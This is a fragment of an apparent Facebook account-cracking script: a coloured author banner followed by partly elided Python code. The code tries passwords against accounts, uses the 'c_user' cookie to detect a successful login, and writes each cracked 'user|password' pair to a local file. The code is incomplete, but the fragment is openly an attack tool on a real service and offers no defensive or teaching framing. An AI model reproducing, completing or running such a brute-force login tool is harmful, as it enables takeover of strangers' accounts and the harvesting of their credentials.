...
▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▀
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           MEHEDI HASAN SHAKIL
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          MEHEDI HASAN 
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           MEHEDI -FAST
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s MEHEDI[-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('MEHEDI_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
